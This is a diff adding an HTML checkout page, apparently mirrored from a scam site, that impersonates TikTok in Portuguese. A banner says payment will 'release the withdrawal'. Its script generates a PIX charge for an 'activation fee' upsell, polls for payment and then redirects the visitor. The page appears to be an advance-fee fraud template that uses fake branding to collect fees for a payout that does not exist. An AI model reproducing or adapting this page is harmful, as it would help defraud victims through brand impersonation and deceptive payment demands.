@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<!-- Mirrored from bonusdotik.shop/up1/checkout/index.html?upsell=up1 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Jan 2026 23:51:28 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout - TikTok</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #FFFFFF; color: #161823; }
+        
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.2s ease;
+        }
+        .btn-tiktok:active { transform: scale(0.96); opacity: 0.9; }
+        
+        .logo-sharp {
+            filter: contrast(1.1) brightness(1.05);
+            image-rendering: -webkit-optimize-contrast;
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="antialiased">
+    <div class="bg-black text-white text-center py-2 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+        Finalize seu pagamento para liberar o saque
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+        <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+            <img src="https://i.postimg.cc/XYwkPWhz/imagem-2026-01-02-213823889.png" 
+                 alt="TikTok Logo" 
+                 class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm">
+            <div class="text-center">
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento</p>
+                <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">R$ 0,00</h2>
+            </div>
+        </div>
+
+        <div class="px-6 py-8">
+            <!-- Loading -->
+            <div id="loading" class="flex flex-col items-center justify-center min-h-[400px]">
+                <div class="text-center">
+                    <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-[#FE2C55] border-t-transparent mb-6"></div>
+                    <p class="text-gray-700 font-bold text-lg">Gerando código PIX...</p>
+                    <p class="text-gray-500 text-sm mt-2">Aguarde um momento</p>
+                </div>
+            </div>
+
+            <!-- QR Code -->
+            <div id="qrcodeSection" class="hidden">
+                <div class="text-center mb-6">
+                    <h3 class="text-2xl font-black mb-2 text-gray-900">Escaneie o QR Code</h3>
+                    <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
+                </div>
+                <div class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
+                    <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg">
+                </div>
+                <div class="mb-6">
+                    <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
+                    <div class="flex gap-2">
+                        <input type="text" id="pixCode" readonly 
+                               class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono">
+                        <button onclick="copyPixCode()" class="btn-tiktok px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all">
+                            COPIAR
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Instruções de Pagamento PIX -->
+                <div class="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-2xl p-5 mb-6 border border-emerald-200">
+                    <h4 class="text-base font-black text-emerald-800 mb-4 flex items-center gap-2">
+                        <span class="text-xl">📱</span> Como pagar com PIX
+                    </h4>
+                    <div class="space-y-3">
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                <span class="text-white text-xs font-bold">1</span>
+                            </div>
+                            <p class="text-sm text-gray-700">Abra o <strong>app do seu banco</strong> no celular</p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                <span class="text-white text-xs font-bold">2</span>
+                            </div>
+                            <p class="text-sm text-gray-700">Escolha pagar com <strong>PIX</strong> e selecione <strong>"Copia e Cola"</strong> ou <strong>"QR Code"</strong></p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                <span class="text-white text-xs font-bold">3</span>
+                            </div>
+                            <p class="text-sm text-gray-700"><strong>Cole o código</strong> copiado ou <strong>escaneie o QR Code</strong> acima</p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                <span class="text-white text-xs font-bold">4</span>
+                            </div>
+                            <p class="text-sm text-gray-700">Confirme o pagamento e <strong>aguarde a confirmação</strong></p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
+                    <p class="text-sm text-gray-700">
+                        <strong class="text-blue-700">Aguardando pagamento...</strong><br>
+                        <span class="text-gray-600">O status será atualizado automaticamente.</span>
+                    </p>
+                </div>
+                <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
+                    Status: Aguardando pagamento
+                </div>
+            </div>
+        </div>
+
+        <!-- Sucesso -->
+        <div id="successSection" class="hidden px-6 py-8">
+            <div class="text-center">
+                <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h3 class="text-2xl font-black mb-2 text-green-600">Pagamento Confirmado!</h3>
+                <p class="text-gray-600 mb-6">Seu saque será liberado em breve.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+const urlParams = new URLSearchParams(window.location.search);
+const upsellId = urlParams.get('upsell') || 'up1';
+
+let transactionId = null;
+let checkInterval = null;
+let isGeneratingPix = false;
+
+async function loadUpsellValueAndGeneratePix() {
+    if (isGeneratingPix) return;
+    isGeneratingPix = true;
+
+    try {
+        // 🔹 Buscar valor do upsell
+        const valueResponse = await fetch(
+            `../../paradise/get-upsell-value.php?upsell=${upsellId}&_=${Date.now()}`
+        );
+        const valueData = await valueResponse.json();
+
+        if (!valueData.success) {
+            throw new Error('Erro ao buscar valor do upsell');
+        }
+
+        document.getElementById('paymentValue').textContent = valueData.formatted;
+
+        // 🔹 Gerar PIX
+        const response = await fetch('../../paradise/payments.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Cache-Control': 'no-cache, no-store, must-revalidate'
+            },
+            body: JSON.stringify({
+                value: valueData.value,
+                productName: `Taxa de Ativação - ${upsellId.toUpperCase()}`
+            })
+        });
+
+        const result = await response.json();
+
+        if (!result.success) {
+            throw new Error(result.error || 'Falha ao gerar PIX');
+        }
+
+        transactionId = result.transactionId;
+
+        // 🔹 Exibir QR Code
+        document.getElementById('loading').classList.add('hidden');
+        document.getElementById('qrcodeSection').classList.remove('hidden');
+
+        document.getElementById('qrCodeImage').src = result.paymentInfo.base64QrCode;
+        document.getElementById('pixCode').value = result.pixCode;
+
+        startPaymentCheck();
+
+    } catch (err) {
+        console.error(err);
+        alert('Erro ao gerar pagamento. Atualize a página.');
+    } finally {
+        isGeneratingPix = false;
+    }
+}
+
+function copyPixCode() {
+    const input = document.getElementById('pixCode');
+    input.select();
+    input.setSelectionRange(0, 99999);
+    document.execCommand('copy');
+    alert('Código PIX copiado!');
+}
+
+// ✅ VERIFICAÇÃO REAL + REDIRECIONAMENTO
+function startPaymentCheck() {
+    checkInterval = setInterval(async () => {
+        if (!transactionId) return;
+
+        try {
+            // ⚠️ Aqui não enviamos o redirect no query string
+            const response = await fetch(
+                `../../paradise/verify.php?transactionId=${transactionId}&_=${Date.now()}`
+            );
+            const result = await response.json();
+
+            document.getElementById('paymentStatus').textContent =
+                `Status: ${result.status}`;
+
+            if (result.status === 'APPROVED') {
+                clearInterval(checkInterval);
+
+                // feedback visual opcional
+                document.getElementById('qrcodeSection').classList.add('hidden');
+                document.getElementById('successSection').classList.remove('hidden');
+
+                // 🔥 REDIRECIONAMENTO FINAL para o link do JSON
+                setTimeout(() => {
+                    window.location.href = result.redirect;
+                }, 1500);
+            }
+
+        } catch (e) {
+            console.error('Erro ao verificar pagamento', e);
+        }
+    }, 3000);
+}
+
+// 🚀 Auto start
+loadUpsellValueAndGeneratePix();
+</script>
+
+</body>
+
+<!-- Mirrored from bonusdotik.shop/up1/checkout/index.html?upsell=up1 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Jan 2026 23:51:28 GMT -->
+</html>
+
